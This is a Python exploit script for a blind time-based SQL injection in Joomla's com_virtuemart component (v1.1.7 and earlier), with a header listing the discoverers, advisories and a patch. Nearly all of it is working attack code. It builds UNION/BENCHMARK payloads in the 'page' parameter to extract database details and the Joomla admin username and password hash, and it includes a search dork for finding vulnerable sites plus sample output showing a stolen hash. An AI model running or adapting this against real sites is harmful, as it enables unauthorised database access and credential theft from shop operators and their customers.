#!/usr/bin/python
#
# Joomla! com_virtuemart <= v1.1.7 Blind SQL Injection Exploit.
# Found by: TecR0c & mr_me
# Discovery date: 11/2/2011
# Code by: mr_me
# Vendor: http://virtuemart.net/
# Download: http://virtuemart.net/downloads
# Dork: inurl:"?option=com_virtuemart" > 46 million results
# Patch: http://dev.virtuemart.net/attachments/202/Patch-VirtueMart-1.1.7a.zip 
# References: 
# - http://www.stratsec.net/Research/Advisories/VirtueMart-SQL-Injection-(SS-2011-003)
# - http://virtuemart.net/security-bulletins/396-vm-security-bulletin-2011-02-18
#
# "The more you educate yourself the more you understand where things come from the more obvious things become
# and you begin to see lies everywhere. You have to know the truth and seek the truth and the truth will set you free."
# - zeitgeist addendum
#
# Description:
# ============
# With its fully-featured eCommerce engine, VirtueMart is perfect to sell your Goods online 
# and drive your Business to new Heights. Despite being Open Source Software it powers large 
# Online Shops providing the Performance, Usability and Security you expect from professional Software.
# 
# Explantation:
# =============
# There is a Blind SQL Injection vulnerability in the "page" variable of the virtuemart component. 
# Because of the fact that Joomla core filters '<' or '>' characters, we can only use '=' to test for true/false
# statements. This of course will send an enormous number of queries the target. During testing, 9145
# queries were sent to fully steal the admin user/hash. This PoC was tested on the latest version
# of virtuemart (1.1.7) at the time of discovery. Depending on your purpose, you may have to adjust the 
# timings of benchmark and time to last byte (ttlb).
# 
# Tested on Joomla v1.5.22 with virtuemart:
# ==========
# - v1.1.7
# - v1.1.6
# - v1.1.4
#
# [mr_me@pluto com_virtuemart]$ python virtuemart.py -p localhost:8080 -t 192.168.1.7 -d /webapps/joomla/
# 
# 	| ------------------------------------------------------------------- |
# 	| Joomla! com_virtuemart <= v1.1.7 Remote Blind SQL Injection Exploit |
# 	| by mr_me - net-ninja.net ------------------------------------------ |
# 
# (+) PoC started on Sat Feb 12 17:26:15 2011
# (+) Exploiting target @: http://192.168.1.7/webapps/joomla/
# (+) Testing proxy @ localhost:8080.. proxy is found to be working!
# (+) Using time based SQL Injection.
# (+) This will take time, go grab a coffee..
# 
# (!) Getting database version: 5.1.41-3ubuntu12.9
# (!) Getting database user: root@localhost
# (!) Getting database name: joomla
# (!) Getting Joomla admin: admin:eb970f9dfca9d7353083ab37cf097e21:pL356HEW2hfl88NWuFpgjLDfy2gKwIHR
# (+) PoC finished on Sat Feb 12 18:38:05 2011
#

import sys, urllib, urllib2, re, time
from optparse import OptionParser

# just printable ascii please
lower_value = 32
upper_value = 126

vuluri = "index.php?option=com_virtuemart&page%3d-1"
basicInfo = {'version':'@@version', 'user':'user()', 'name':'database()'}

usage = "./%prog [<options>] -t [target] -d [directory]"
usage += "\nExample: ./%prog -p localhost:8080 -t 192.168.1.7 -d /webapps/joomla/"

parser = OptionParser(usage=usage)
parser.add_option("-p", type="string",action="store", dest="proxy",
                  help="HTTP Proxy <server:port>")
parser.add_option("-t", type="string", action="store", dest="target",
                  help="The Target server <server:port>")
parser.add_option("-d", type="string", action="store", dest="directory",
                  help="Directory path to the CMS")

(options, args) = parser.parse_args()

def banner():
    print "\n\t| ------------------------------------------------------------------- |"
    print "\t| Joomla! com_virtuemart <= v1.1.7 Remote Blind SQL Injection Exploit |"
    print "\t| by mr_me - net-ninja.net ------------------------------------------ |\n"

if len(sys.argv) < 4:
	banner()
	parser.print_help()
	sys.exit(1)

def timer():
	now = time.localtime(time.time())
        return time.asctime(now)

def testProxy():
	check = 1
	sys.stdout.write("(+) Testing proxy @ %s.. " % (options.proxy))
	sys.stdout.flush()
	try:
        	req = urllib2.Request("http://www.google.com/")
		req.set_proxy(options.proxy,"http")
		check = urllib2.urlopen(req)
    	except:
        	check = 0
        	pass
    	if check != 0:
        	sys.stdout.write("proxy is found to be working!\n")
        	sys.stdout.flush()
    	else:
        	print "proxy failed, exiting.."
        	sys.exit(1)
	
def getServerResponse(exploit):
	try:
		uri = "http://"+options.target+options.directory+exploit 
		request = urllib2.Request(uri)
		if options.proxy:
			request.set_proxy(options.proxy, "http")
		
		start = time.time()
		resp = urllib2.urlopen(request)
		check = resp.read()
		ttlb = time.time() - start
	except urllib.error.HTTPError, error:
			check = error.read()
	except socket.error:
		print "(-) Proxy connection failed"
		sys.exit(1)
	return check, ttlb

def getBasicDbInfo(basicInfo, key, limit):
	for i in range(1,limit):
		for j in range(lower_value,upper_value):
			request = (vuluri + "'+UnIOn+seLEcT+iF(ascii(substring(%s,%s,1))=%s,benchmark(5000000,MD5('x')),NULL)--+junk.page"
			% (basicInfo[key],str(i),str(j)))
			try:
				resp, ttlb = getServerResponse(request)
			except:
				print "\n(-) Exiting.."
				sys.exit(1)
			if ttlb >= 3.5:
				sys.stdout.write("%s" % (chr(j)))
				sys.stdout.flush()
				break


def getJosUser(selectStmt, limit):
	for i in range(1,limit):
		for j in range(lower_value,upper_value):
			request = (vuluri + "'+uNIoN+SeLeCt+iF(ascii(substring(%s,%s,1))=%s,benchmark(5000000,MD5('x')),NULL)--+junk.page"
                        % (selectStmt,str(i),str(j)))
			resp, ttlb = getServerResponse(request)
                        if ttlb >= 3.5:
                                sys.stdout.write("%s" % (chr(j)))
                                sys.stdout.flush()
                                break

def doBlindSqlInjection():
	print "(+) Using time based SQL Injection."
        print "(+) This will take time, go grab a coffee.."

	for key in basicInfo:
		sys.stdout.write("\n(!) Getting database %s: " % (key))
		sys.stdout.flush()
		
		for i in range(1,50):
			request = (vuluri + "'+unIoN+sEleCt+if(length(%s)=%s,benchmark(5000000,MD5('x')),NULL)--+junk.page"
                	% (basicInfo[key],str(i)))		
			try:
                    		resp, ttlb = getServerResponse(request)
                	except:
                       		print "\n(-) Exiting.."
                        	sys.exit(1)
                	if ttlb >= 3.5:
                        	break

		getBasicDbInfo(basicInfo, key, i+1)

	sys.stdout.write("\n(!) Getting Joomla admin: ")
	sys.stdout.flush()

	for i in range(1,100):
		lengthOfAdminString = "(select+length(concat(username,0x3a,password))+from+jos_users+limit+1)"
		request = (vuluri + "'+union+select+if(%s=%s,BENCHMARK(5000000,MD5('x')),NULL)--+junk.page"
		% (lengthOfAdminString,str(i)))
		try:
			resp, ttlb = getServerResponse(request)
		except:
			print "\n(-) Exiting.."
			sys.exit(1)
		if ttlb >= 3.5:
			break
	
	getJosStmt = "(select+concat(username,0x3a,password)+from+jos_users+limit+0,1)"
	getJosUser(getJosStmt, i+1)

if __name__ == "__main__":
	banner()
	print "(+) PoC started on %s" % (timer())
	print "(+) Exploiting target @: http://%s" % (options.target+options.directory)
	if options.proxy:
		testProxy()
	doBlindSqlInjection()	
	print "\n(+) PoC finished on %s" % (timer())
